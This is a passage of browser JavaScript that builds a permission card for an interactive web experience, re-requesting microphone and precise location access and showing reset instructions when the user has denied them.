    }

    const message = document.createElement('p');
    message.textContent = messageText;
    message.style.color = '#4a4a4a';
    message.style.fontSize = '1.1rem';
    message.style.marginBottom = '1.5rem';

    // Add instructions for browser permission reset if needed
    if (error && !(error.type === 'location_off')) {
        const helpText = document.createElement('p');
        helpText.innerHTML = "If you accidentally denied permissions, follow this and continue as usual:";
        helpText.style.color = '#666';
        helpText.style.fontSize = '0.9rem';
        helpText.style.marginBottom = '0.5rem';
        helpText.style.textAlign = 'left';
        
        // Add the instructions image
        const instructionsImg = document.createElement('img');
        instructionsImg.src = 'media/instructions.jpeg';
        instructionsImg.alt = 'Instructions to reset permissions';
        instructionsImg.style.width = '100%';
        instructionsImg.style.maxWidth = '350px';
        instructionsImg.style.borderRadius = '8px';
        instructionsImg.style.marginBottom = '1.5rem';
        instructionsImg.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
        
        card.appendChild(helpText);
        card.appendChild(instructionsImg);
    }

    // If location is turned off on device, show specific button
    const givePermissionButton = document.createElement('button');
    if (error && error.type === 'location_off') {
        givePermissionButton.textContent = "I've Turned On Location Services";
    } else {
        givePermissionButton.textContent = "Grant Required Permissions";
    }
    
    givePermissionButton.style.padding = '0.8rem 1.2rem';
    givePermissionButton.style.fontSize = '1rem';
    givePermissionButton.style.backgroundColor = '#ff6b6b';
    givePermissionButton.style.color = '#fff';
    givePermissionButton.style.border = 'none';
    givePermissionButton.style.borderRadius = '50px';
    givePermissionButton.style.cursor = 'pointer';
    givePermissionButton.style.transition = 'all 0.3s ease';
    givePermissionButton.style.marginBottom = '1rem';

    givePermissionButton.addEventListener('mouseover', () => {
         givePermissionButton.style.backgroundColor = '#ff4757';
    });
    givePermissionButton.addEventListener('mouseout', () => {
         givePermissionButton.style.backgroundColor = '#ff6b6b';
    });

    givePermissionButton.addEventListener('click', () => {
        // Try to get both permissions again with appropriate handling
        let micPromise;
        
        if (!microphonePermissionGranted) {
            micPromise = navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    microphonePermissionGranted = true;
                    return stream;
                })
                .catch(error => {
                    console.error('Microphone permission error after retry:', error);
                    throw error;
                });
        } else {
            // If we already have microphone permission, just return the stream
            micPromise = window.microphoneStream ? 
                Promise.resolve(window.microphoneStream) : 
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        microphonePermissionGranted = true;
                        return stream;
                    });
        }
        
        let geoPromise;
        
        if (!locationPermissionGranted) {
            geoPromise = new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        locationPermissionGranted = true;
                        resolve(position);
                    },
                    error => {
                        console.error('Location permission error after retry:', error);
                        // Check if the error is due to device location being turned off
                        if (error.code === 2) { // POSITION_UNAVAILABLE
                            reject({ type: 'location_off', message: 'Please turn on your device location and try again.' });
                        } else {
                            reject(error);
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        } else {
            // If we already have location permission, just use the stored location
            geoPromise = userLocation ? Promise.resolve({ coords: userLocation }) : 
                new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        position => resolve(position),
                        error => reject(error),
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                });
        }
        
        Promise.all([micPromise, geoPromise])
            .then(([micStream, geoPosition]) => {
                overlay.remove();
                startRecording(micStream);
                handleLocationPermission(geoPosition);
                startExperience();
            })
            .catch(error => {
                console.error('Permission error after retry:', error);
                // Update the card with new error information instead of creating a new one
                overlay.remove();
                showPermissionCard(error);
            });
    });

    card.appendChild(message);
    card.appendChild(givePermissionButton);
    
    overlay.appendChild(card);
    document.body.appendChild(overlay);
}
